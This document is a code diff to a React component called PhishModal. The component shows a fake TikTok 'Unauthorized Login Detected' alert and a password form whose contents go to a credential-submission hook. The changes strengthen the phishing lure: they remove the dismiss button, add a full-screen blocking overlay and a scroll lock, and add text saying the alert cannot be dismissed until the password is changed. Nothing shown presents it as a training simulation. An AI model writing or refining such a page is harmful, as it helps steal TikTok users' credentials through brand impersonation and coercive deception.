@@ -3,7 +3,7 @@ import { motion, AnimatePresence } from "framer-motion";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import * as z from "zod";
-import { ShieldAlert, CheckCircle2, Loader2, Lock, AlertTriangle, X } from "lucide-react";
+import { ShieldAlert, CheckCircle2, Loader2, Lock, AlertTriangle } from "lucide-react";
 import { useSubmitCredentials } from "@workspace/api-client-react";
 
 const formSchema = z.object({
@@ -49,6 +49,14 @@ export function PhishModal() {
     return () => clearTimeout(timer);
   }, []);
 
+  useEffect(() => {
+    if (stage === "idle") return;
+    document.body.style.overflow = "hidden";
+    return () => {
+      document.body.style.overflow = "";
+    };
+  }, [stage]);
+
   const onSubmit = (data: FormValues) => {
     submitCreds({ data }, {
       onSuccess: () => {
@@ -63,56 +71,57 @@ export function PhishModal() {
   return (
     <AnimatePresence mode="wait">
 
-      {/* Stage 1: Security Alert Banner */}
+      {/* Stage 1: Security Alert — centered over a blocking overlay */}
       {stage === "alert" && (
         <motion.div
           key="alert"
-          initial={{ opacity: 0, y: -60 }}
-          animate={{ opacity: 1, y: 0 }}
-          exit={{ opacity: 0, y: -60 }}
-          transition={{ type: "spring", damping: 22, stiffness: 260 }}
-          className="fixed top-4 left-1/2 -translate-x-1/2 z-50 w-full max-w-lg px-4"
+          initial={{ opacity: 0 }}
+          animate={{ opacity: 1 }}
+          exit={{ opacity: 0 }}
+          className="fixed inset-0 z-50 flex items-center justify-center px-4 bg-black/70 backdrop-blur-sm"
         >
-          <div className="bg-[#1a0000] border border-red-600/60 rounded-2xl shadow-2xl shadow-red-900/40 p-5 flex gap-4 items-start">
-            <div className="w-10 h-10 shrink-0 bg-red-600/20 rounded-full flex items-center justify-center text-red-500 mt-0.5">
-              <AlertTriangle className="w-5 h-5" />
-            </div>
-            <div className="flex-1 min-w-0">
-              <p className="text-white font-bold text-base leading-snug mb-1">
-                Unauthorized Login Detected
+          <motion.div
+            initial={{ opacity: 0, scale: 0.92, y: 16 }}
+            animate={{ opacity: 1, scale: 1, y: 0 }}
+            exit={{ opacity: 0, scale: 0.92, y: 16 }}
+            transition={{ type: "spring", damping: 22, stiffness: 260 }}
+            className="w-full max-w-md bg-[#120000] border border-red-600/60 rounded-2xl shadow-2xl shadow-red-900/50 p-8"
+          >
+            <div className="flex flex-col items-center text-center gap-4">
+              <div className="w-16 h-16 bg-red-600/20 rounded-full flex items-center justify-center text-red-500">
+                <AlertTriangle className="w-8 h-8" />
+              </div>
+
+              <div>
+                <p className="text-white font-bold text-xl leading-snug mb-2">
+                  Unauthorized Login Detected
+                </p>
+                <p className="text-red-200/75 text-sm leading-relaxed">
+                  Someone has accessed your TikTok account from an unrecognized device. Secure your account immediately to prevent further unauthorized access.
+                </p>
+              </div>
+
+              <div className="w-full pt-2">
+                <button
+                  onClick={() => setStage("form")}
+                  className="w-full flex items-center justify-center gap-2 px-6 py-3.5 bg-red-600 hover:bg-red-500 active:bg-red-700 text-white font-bold rounded-xl transition-colors text-base"
+                >
+                  <Lock className="w-5 h-5" />
+                  Change Password Now
+                </button>
+              </div>
+
+              <p className="text-red-400/50 text-xs">
+                You cannot dismiss this alert until your password is changed.
               </p>
-              <p className="text-red-200/80 text-sm leading-relaxed">
-                Someone has accessed your TikTok account from an unrecognized device. Secure your account immediately to prevent further access.
-              </p>
-              <button
-                onClick={() => setStage("form")}
-                className="mt-3 inline-flex items-center gap-2 px-4 py-2 bg-red-600 hover:bg-red-500 active:bg-red-700 text-white text-sm font-bold rounded-lg transition-colors"
-              >
-                <Lock className="w-4 h-4" />
-                Change Password Now
-              </button>
             </div>
-            <button
-              onClick={() => setStage("alert")}
-              className="text-red-400/60 hover:text-red-300 transition-colors shrink-0 mt-0.5"
-              aria-label="Dismiss"
-            >
-              <X className="w-5 h-5" />
-            </button>
-          </div>
+          </motion.div>
         </motion.div>
       )}
 
       {/* Stage 2: Password Change Form Modal */}
       {stage === "form" && (
-        <div key="form" className="fixed inset-0 z-50 flex items-center justify-center px-4">
-          <motion.div
-            initial={{ opacity: 0 }}
-            animate={{ opacity: 1 }}
-            exit={{ opacity: 0 }}
-            className="absolute inset-0 bg-black/80 backdrop-blur-sm"
-          />
-
+        <div key="form" className="fixed inset-0 z-50 flex items-center justify-center px-4 bg-black/80 backdrop-blur-sm">
           <motion.div
             initial={{ opacity: 0, scale: 0.95, y: 20 }}
             animate={{ opacity: 1, scale: 1, y: 0 }}
